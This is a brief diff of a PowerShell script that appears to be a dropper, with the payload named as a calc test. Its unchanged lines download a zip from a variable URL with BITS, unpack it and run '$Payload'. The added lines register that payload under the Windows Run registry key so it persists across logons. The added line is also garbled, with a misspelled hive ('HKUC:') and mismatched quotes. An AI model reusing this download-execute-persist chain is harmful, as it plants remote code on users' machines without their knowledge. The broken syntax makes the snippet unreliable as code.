@@ -8,3 +8,5 @@ if (-not (test-path $Folder)) {New-Item -Path $Folder -ItemType Directory};
 Start-BitsTransfer -Source $ZipUrl -Destination $NewZip; Expand-Archive -Path $NewZip -Destination $Folder -Force;
 
 Remove-Item $NewZip; start-process $Payload;
+
+New-itemproperty -Path 'HKUC:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "TestWithCalc' -Value $Payload -PropertyType 'String';
